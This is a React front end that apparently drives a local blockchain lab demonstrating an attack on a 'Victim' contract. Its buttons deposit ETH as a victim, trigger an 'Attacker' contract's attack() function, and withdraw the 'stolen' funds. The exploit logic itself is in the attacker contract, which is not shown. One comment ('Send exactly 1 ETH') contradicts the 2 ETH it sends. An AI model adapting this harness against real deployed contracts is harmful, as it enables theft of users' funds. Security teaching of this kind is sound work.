
import { useEffect, useState } from "react";
import { ethers, BrowserProvider , Contract, verifyMessage } from "ethers";
import attacker from "./contracts/Attacker.json" 
import Victim from "./contracts/Victim.json" 
function App() {
  var signer = null;
  var provider = null;
  const [contract , setContract] = useState(null);
  const [writerContract , setWriterContract] = useState(null);

  const [vcontract , setVcontract] = useState(null);
  const [vwriterContract , setVwriterContract] = useState(null);
  const [signerGlob , setSignerGlob] = useState(null);

  const initcontract = async()=>{
    let contract = new Contract("0xBAe0B37DF7ad8Bb6c73bBC1aA24286C78B55aDe6" , attacker.abi ,provider);
    let contracttmpsinger = new Contract("0xBAe0B37DF7ad8Bb6c73bBC1aA24286C78B55aDe6",attacker.abi,signer);
    setContract(contract);
    setWriterContract(contracttmpsinger);


    let vcontract = new Contract("0xC94996cCcE002794859f6618E8DFFe3CbDf3E195" , Victim.abi ,provider);
    let vcontracttmpsinger = new Contract("0xC94996cCcE002794859f6618E8DFFe3CbDf3E195",Victim.abi,signer);
    setVcontract(vcontract);
    setVwriterContract(vcontracttmpsinger);

  }


  const startTheAttack = async()=>{
    await writerContract.attack({
      value: ethers.parseEther("2.0") // Send exactly 1 ETH
    });
  }

  const deposit = async()=>{
    await vwriterContract.deposit({
      value: ethers.parseEther("90.0")
    })
  }
  const showaccount = async()=>{
    let balance = await vcontract.getbalances();
    alert(balance);
  }
  const withdraw = async()=>{
    await vwriterContract.withdraw();
  }
  const stealthemoney = async()=>{
    await writerContract.withdrawstolenmoney();
  }
  useEffect(()=>async function(){
    if(!window.ethereum){
      provider = new ethers.JsonRpcProvider('http://localhost:7545');
    }else{
      provider = new ethers.BrowserProvider(window.ethereum);
    }
    signer = await provider.getSigner();
    setSignerGlob(signer);
    await initcontract();
  })
  return (
    <div className="App">
      <header className="App-header">

      <button onClick={async ()=>{await showaccount();}}>show my account</button>
      <br/>
      <button onClick={async ()=>{await deposit();}}>Deposit as poor vitim</button>
      
      <button onClick={async ()=>{await withdraw();}}>Take my money out</button>
      <br/>
      <button onClick={async ()=>{await startTheAttack();}}>start the attack</button>
      <br/>
      <button onClick={async ()=>{await stealthemoney();}}>steal the money</button>
      </header>
    </div>
  );
}

export default App;
